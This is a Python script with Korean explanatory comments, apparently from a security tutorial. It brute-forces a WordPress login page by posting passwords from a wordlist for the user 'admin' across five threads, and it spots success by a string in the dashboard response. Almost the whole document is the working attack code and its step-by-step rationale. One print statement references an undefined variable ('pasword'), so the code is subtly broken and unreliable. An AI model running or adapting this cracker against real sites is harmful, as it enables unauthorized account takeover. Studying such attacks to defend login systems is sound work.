'''
1. 로그인 페이지의 HTML 코드를 확보합니다. 이는 브라우저의 소스코드보기로
    얻을 수 있습니다.
2. 로그인 페이지의 HTML코드에서 로그인을 위한 form 태그를 찾습니다.
    - <form name="loginform" id="loginform" action="
        http://192.168.0.14/blog/wp-login.php" method="post">
3. form 태그의 action 속성값을 확인합니다.
    action="http://192.168.0.14/blog/wp-login.php"는 로그인을 처리하는코드입니다.
4. form 태그에서 로그인 정보를 입력하는 input 태그를 찾습니다.
    - <input type="text" name="log" id="user_login" class="input" value=""
     size="20"/>
    - <input type="password" name="pwd" id="user_pass" class="input" value=""
     size="20"/>
5. input 태그에서 name 속성값을 확인합니다. name 속성값이 'log'인 것은 사용자
    아이디를 입력하는 부분이고, 'pwd'인것은 패스워드를 입력하는 부분입니다.
6. 워드프레스는 로그인이 성공하면 '알림판' 페이지로 이동합니다. 이 페이지에
    나타나는 문구(예를들어, 환영합니다. 업데이트 등)를 크래킹 성공 여부 판단을
    위한 문자열로 사용합니다.
'''

from urllib.request import build_opener, HTTPCookieProcessor
import http.cookiejar as cookielib
from html.parser import HTMLParser
from urllib.parse import urlencode
from queue import Queue
from threading import Thread


num_threads = 5     # 스레드 구동 개수
wordlist = 'dictionary.txt'    # 패스워드 무차별 공격을 위한 단어 사전


targeturl = 'http://192.168.0.14/blog/wp-login.php'     #로그인페이지
targetpost = 'http://192.168.0.14/blog/wp-login.php'    #로그인 처리코드


username_field = 'log'  # 로그인 input 태그의 사용자 아이디 입력부 이름
pass_field = 'pwd'      # 로그인 input 태그의 패스워드 입력부 이름
check = 'update'        # 로그인 성공 여부를 판단하는 문자열
isBingo = False         # 크래킹 성공시 스레드 중지를 위한 플래그


class myHTMLParser(HTMLParser):
    def __init__(self):
        HTMLParser.__init__(self)
        self.tagResult = {}


    def handle_starttag(self, tag, attrs):
        if tag == 'input':
            tagname = None
            tagvalue = None
            for name, value in attrs:
                if name == 'name':
                    tagname = value
                if name == 'value':
                    tagvalue = value

            if tagname is not None:
                self.tagResult[tagname] = tagvalue


def webAuthCracker(q, username):
    global isBingo
    while not q.empty() and not isBingo:
        password = q.get_nowait().rstrip()
        cookies = cookielib.FileCookieJar('cookies')
        opener = build_opener(HTTPCookieProcessor(cookies))
        res = opener.open(targeturl)
        htmlpage = res.read().decode()
        print('+++TRYING %s: %s' %(username, pasword))
        parseR = myHTMLParser()
        parseR.feed(htmlpage)
        inputtags = parseR.tagResult
        inputtags[username_field] = username
        inputtags[pass_field] = password


        loginData = urlencode(inputtags).encode('utf-8')
        loginRes = opener.open(targetpost, data=loginData)
        loginResult = loginRes.read().decode()


        if check in loginResult:
            isBingo = True
            print('---CRACKING SUCCESS!')
            print('---Username [%s] Password [%s]' %(username, password))
            print('---Waiting Other Threads Terminated..')


def main():
    username = 'admin'
    q = Queue()
    with open(wordlist, 'rt') as f:
        words = f.readlines()

    for word in words:
        word = word.rstrip()
        q.put(word)

    print('+++ [%s] CRACKING WEB AUTH START..' %username)
    for i in range(num_threads):
        t = Thread(target=webAuthCracker, args=(q, username))
        t.start()


if __name__ == '__main__':
    main()



'''
사용자 아이디가 'admin'이라는 것을 알았을 대 인증 패스워드를 사전대입 공격으로
크래킹하는 코드입니다. 수행하는 로직은 다음과 같습니다.
1. 로그인페이지의 HTML 코드를 추출하고 수신한 쿠키를 저장합니다.
2. HTML 코드에서 모든 input 태그를 파싱합니다.
3. 파싱한 input 태그의 name 속성값이 'log'와 'pwd'인 필드에 사용자 아이디인
    'admin'과 선택한 패수워드를 설정합니다.
4. 모든 HTML form 필드와 저장된 쿠키를 로그인 처리 코드의 URI로 HTTP POST를 이용해
    전송합니다.
5. 응답받은 데이터에서 로그인 성공 여부를 확인할 수 있는 문자열을 이용해 패스워드
    크래킹이 성공했는지 확인합니다.
'''
        
